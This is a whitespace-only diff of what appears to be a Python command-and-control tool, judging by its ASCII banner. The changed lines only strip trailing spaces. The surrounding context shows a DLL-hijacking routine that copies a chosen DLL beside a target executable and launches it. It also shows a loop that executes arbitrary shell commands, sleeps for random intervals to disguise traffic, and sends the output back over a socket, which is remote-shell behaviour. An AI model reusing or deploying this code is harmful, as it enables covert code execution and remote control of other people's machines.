@@ -28,10 +28,10 @@ RESET = '\033[0m'
 
 
 print(BLUE + """
-██████╗ ██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗  ██████╗ ██████╗ 
+██████╗ ██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗  ██████╗ ██████╗
 ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝ ██╔════╝ ╚════██╗
 ██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝██║   ██║ ╚███╔╝  ██║       █████╔╝
-██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗  ██║      ██╔═══╝ 
+██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗  ██║      ██╔═══╝
 ██████╔╝██║  ██║╚██████╔╝██║     ██████╔╝╚██████╔╝██╔╝ ██╗ ╚██████╗ ███████╗
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝  ╚═════╝ ╚══════╝
 """ + RESET)
@@ -79,10 +79,10 @@ def hijack_dll():
 
     # Prompt the user for the path of the target executable
     target_exe = input("Enter the path of the target executable: ")
-    
+
     # Copy the specified DLL to the directory of the target executable
     shutil.copy(dll_path, os.path.dirname(target_exe))
-    
+
     # Launch the target executable
     subprocess.run(target_exe, shell=True)
 
@@ -113,15 +113,15 @@ while True:
     command = input("Enter a command to execute (or type 'exit' to quit): ")
     if command.lower() == "exit":
         break
-    
+
     # Randomize communication intervals
     time.sleep(random.uniform(1, 5))
-    
+
     # Send the command to the shell process and get the output
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
     stdout = result.stdout
     stderr = result.stderr
-    
+
     # Send the command and output back to the client
     client_socket.send(command.encode())
     client_socket.send(stdout.encode())
